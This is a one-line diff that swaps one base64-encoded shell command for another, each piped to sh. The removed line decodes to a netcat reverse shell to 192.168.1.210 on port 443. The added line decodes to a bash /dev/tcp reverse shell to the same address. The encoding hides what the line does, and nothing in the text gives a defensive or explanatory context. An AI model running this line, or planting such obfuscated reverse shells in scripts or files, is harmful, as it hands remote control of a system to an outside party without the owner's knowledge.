@@ -1,1 +1,1 @@
-echo bmMgMTkyLjE2OC4xLjIxMCA0NDMgLWUgL2Jpbi9zaA== | base64 -d | sh
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMjEwLzQ0MyAwPiYx | base64 -d | sh
